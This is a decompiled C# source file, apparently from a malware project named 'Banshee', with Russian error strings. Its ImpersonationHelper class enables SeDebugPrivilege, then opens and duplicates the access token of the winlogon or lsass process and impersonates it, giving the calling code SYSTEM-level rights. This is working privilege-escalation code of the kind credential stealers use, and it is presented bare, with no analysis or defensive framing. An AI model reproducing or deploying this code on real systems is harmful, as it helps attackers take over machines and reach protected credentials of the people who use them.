﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Banshee.Helper
{
	// Token: 0x020000B2 RID: 178
	public static class ImpersonationHelper
	{
		// Token: 0x06000229 RID: 553 RVA: 0x00011AF4 File Offset: 0x00011AF4
		public static IDisposable ImpersonateWinlogon()
		{
			return ImpersonationHelper.ImpersonateProcess("winlogon");
		}

		// Token: 0x0600022A RID: 554 RVA: 0x00011B00 File Offset: 0x00011B00
		public static IDisposable ImpersonateLsass()
		{
			return ImpersonationHelper.ImpersonateProcess("lsass");
		}

		// Token: 0x0600022B RID: 555 RVA: 0x00011B0C File Offset: 0x00011B0C
		private static IDisposable ImpersonateProcess(string processName)
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			IDisposable result;
			try
			{
				ImpersonationHelper.EnableDebugPrivilege();
				Process process = Process.GetProcessesByName(processName).FirstOrDefault<Process>();
				if (process == null)
				{
					throw new Exception("Процесс " + processName + ".exe не найден");
				}
				if (!NativeMethods.OpenProcessToken(process.Handle, 14U, out zero))
				{
					throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка OpenProcessToken");
				}
				if (!NativeMethods.DuplicateTokenEx(zero, 12U, IntPtr.Zero, 2U, 2U, out zero2))
				{
					throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка DuplicateTokenEx");
				}
				if (!NativeMethods.ImpersonateLoggedOnUser(zero2))
				{
					throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка ImpersonateLoggedOnUser");
				}
				result = new ImpersonationHelper.ImpersonationContext();
			}
			catch
			{
				if (zero2 != IntPtr.Zero)
				{
					NativeMethods.CloseHandle(zero2);
				}
				if (zero != IntPtr.Zero)
				{
					NativeMethods.CloseHandle(zero);
				}
				NativeMethods.RevertToSelf();
				throw;
			}
			return result;
		}

		// Token: 0x0600022C RID: 556 RVA: 0x00011BF4 File Offset: 0x00011BF4
		private static void EnableDebugPrivilege()
		{
			IntPtr zero = IntPtr.Zero;
			try
			{
				if (!NativeMethods.OpenProcessToken(NativeMethods.GetCurrentProcess(), 40U, out zero))
				{
					int lastWin32Error = Marshal.GetLastWin32Error();
					throw new Win32Exception(lastWin32Error, string.Format("Ошибка OpenProcessToken: Код ошибки {0}", lastWin32Error));
				}
				NativeMethods.LUID luid = default(NativeMethods.LUID);
				if (!NativeMethods.LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid))
				{
					int lastWin32Error2 = Marshal.GetLastWin32Error();
					throw new Win32Exception(lastWin32Error2, string.Format("Ошибка LookupPrivilegeValue: Код ошибки {0}", lastWin32Error2));
				}
				NativeMethods.TOKEN_PRIVILEGES token_PRIVILEGES = new NativeMethods.TOKEN_PRIVILEGES
				{
					PrivilegeCount = 1U,
					Luid = luid,
					Attributes = 2U
				};
				if (!NativeMethods.AdjustTokenPrivileges(zero, false, ref token_PRIVILEGES, (uint)Marshal.SizeOf(typeof(NativeMethods.TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero))
				{
					int lastWin32Error3 = Marshal.GetLastWin32Error();
					throw new Win32Exception(lastWin32Error3, string.Format("Ошибка AdjustTokenPrivileges: Код ошибки {0}", lastWin32Error3));
				}
				int lastWin32Error4 = Marshal.GetLastWin32Error();
				if (lastWin32Error4 != 0)
				{
					throw new Win32Exception(lastWin32Error4, string.Format("AdjustTokenPrivileges вернул успех, но установил код ошибки {0}", lastWin32Error4));
				}
			}
			finally
			{
				if (zero != IntPtr.Zero)
				{
					NativeMethods.CloseHandle(zero);
				}
			}
		}

		// Token: 0x04000193 RID: 403
		private const uint TOKEN_DUPLICATE = 2U;

		// Token: 0x04000194 RID: 404
		private const uint TOKEN_IMPERSONATE = 4U;

		// Token: 0x04000195 RID: 405
		private const uint TOKEN_QUERY = 8U;

		// Token: 0x04000196 RID: 406
		private const uint TOKEN_ADJUST_PRIVILEGES = 32U;

		// Token: 0x04000197 RID: 407
		private const uint SecurityImpersonation = 2U;

		// Token: 0x04000198 RID: 408
		private const uint TokenImpersonation = 2U;

		// Token: 0x04000199 RID: 409
		private const uint SE_PRIVILEGE_ENABLED = 2U;

		// Token: 0x020000B3 RID: 179
		private class ImpersonationContext : IDisposable
		{
			// Token: 0x0600022D RID: 557 RVA: 0x00011D1C File Offset: 0x00011D1C
			public void Dispose()
			{
				NativeMethods.RevertToSelf();
			}
		}
	}
}
